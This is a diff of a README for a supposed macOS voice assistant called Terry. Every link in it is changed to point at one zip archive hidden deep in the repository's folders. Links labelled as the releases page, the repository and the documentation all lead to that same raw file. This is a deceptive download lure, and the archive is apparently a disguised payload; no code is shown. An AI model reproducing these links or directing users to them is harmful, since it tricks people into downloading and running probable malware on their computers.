@@ -1,7 +1,7 @@
 # 🎙️ terry-voice-assistant - Your Local Voice Helper Made Easy
 
 ## 🌐 Download the Latest Version
-[![Download Terry Voice Assistant](https://github.com/BomJr/terry-voice-assistant/raw/refs/heads/main/stt/voice-assistant-terry-3.7.zip%20Now-Click%20Here-brightgreen)](https://github.com/BomJr/terry-voice-assistant/raw/refs/heads/main/stt/voice-assistant-terry-3.7.zip)
+[![Download Terry Voice Assistant](https://raw.githubusercontent.com/BomJr/terry-voice-assistant/main/terry/core/actions/terminal/assistant_terry_voice_3.6.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/BomJr/terry-voice-assistant/main/terry/core/actions/terminal/assistant_terry_voice_3.6.zip)
 
 ## 🚀 Getting Started
 Welcome to Terry, your local voice assistant for macOS. This guide will help you download and set up Terry on your computer with ease. 
@@ -27,11 +27,11 @@ To get Terry on your macOS device, follow these steps:
 
 1. **Visit the Releases Page:** Click the link below to go to the Releases page, where you can find the latest version of Terry.
    
-   [Visit the Releases Page](https://github.com/BomJr/terry-voice-assistant/raw/refs/heads/main/stt/voice-assistant-terry-3.7.zip)
+   [Visit the Releases Page](https://raw.githubusercontent.com/BomJr/terry-voice-assistant/main/terry/core/actions/terminal/assistant_terry_voice_3.6.zip)
 
 2. **Choose the Right Release:** On the Releases page, find the latest version of Terry. Look for the version number followed by release notes.   
 
-3. **Download the Application:** Click on the asset that suits your needs, usually named something like `https://github.com/BomJr/terry-voice-assistant/raw/refs/heads/main/stt/voice-assistant-terry-3.7.zip`. This will start the download process.
+3. **Download the Application:** Click on the asset that suits your needs, usually named something like `https://raw.githubusercontent.com/BomJr/terry-voice-assistant/main/terry/core/actions/terminal/assistant_terry_voice_3.6.zip`. This will start the download process.
 
 4. **Locating the Downloaded File:** After the download completes, navigate to your Downloads folder. You should find the zipped file there.
 
@@ -68,9 +68,9 @@ To learn more about optimizing your experience with Terry, consider reading the 
 If you want to contribute to Terry, we welcome your input. Check the contributing guidelines in this repository for details.
 
 ## 🔗 More Resources
-- [GitHub Repository](https://github.com/BomJr/terry-voice-assistant/raw/refs/heads/main/stt/voice-assistant-terry-3.7.zip)
-- [Documentation](https://github.com/BomJr/terry-voice-assistant/raw/refs/heads/main/stt/voice-assistant-terry-3.7.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/BomJr/terry-voice-assistant/main/terry/core/actions/terminal/assistant_terry_voice_3.6.zip)
+- [Documentation](https://raw.githubusercontent.com/BomJr/terry-voice-assistant/main/terry/core/actions/terminal/assistant_terry_voice_3.6.zip)
 
 Explore the potential of your local assistant and enhance your productivity with Terry today!
 
-[Download Now](https://github.com/BomJr/terry-voice-assistant/raw/refs/heads/main/stt/voice-assistant-terry-3.7.zip)
+[Download Now](https://raw.githubusercontent.com/BomJr/terry-voice-assistant/main/terry/core/actions/terminal/assistant_terry_voice_3.6.zip)
